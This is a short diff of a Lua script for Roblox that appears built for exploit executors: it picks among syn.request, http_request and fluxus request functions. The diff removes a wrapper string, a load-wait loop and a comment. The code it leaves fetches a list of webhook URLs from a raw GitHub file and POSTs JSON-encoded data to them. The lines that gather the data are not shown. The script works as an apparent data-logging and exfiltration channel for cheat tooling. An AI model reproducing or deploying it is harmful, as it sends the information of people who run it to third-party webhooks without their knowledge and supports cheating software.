@@ -1,8 +1,4 @@
-@"
-repeat
-    task.wait();
-until game:IsLoaded();
--- NOTHING
+
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -11,7 +7,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 
 local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
 
-local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/WEB-H"  -- ZMIEŃ
+local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/WEB-H"  
 
 local Webhooks = {}
 local success, response = pcall(function()
@@ -79,4 +75,4 @@ pcall(function()
         Body = HttpService:JSONEncode(data)
     })
 end)
-";
+
